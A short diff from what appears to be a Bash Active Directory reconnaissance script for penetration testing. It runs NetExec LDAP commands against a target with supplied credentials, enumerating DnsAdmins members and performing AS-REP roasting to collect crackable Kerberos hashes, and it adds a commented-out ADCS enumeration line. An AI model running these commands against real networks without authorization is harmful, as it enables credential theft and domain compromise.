@@ -136,6 +136,7 @@ if grep -qE '^(389,)+|(,389,)|(,389$)' port-list.txt || grep -qE '^(636,)+|(,636
 		echo "NXC DnsAdmins:" >> nxc-recon.txt
 		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="DnsAdmins" >> nxc-recon.txt
 		echo "" >> nxc-recon.txt
+                # nxc ldap $target -d "domain" -u $user -p $password -M adcs
 		truncate -s 0 nxc-aspreproast-output.txt
 		echo "NXC AS-REP Roasting in nxc-aspreproast-output.txt" >> nxc-recon.txt
 		nxc ldap $target -u $user -p $password --asreproast nxc-aspreproast-output.txt >> nxc-recon.txt
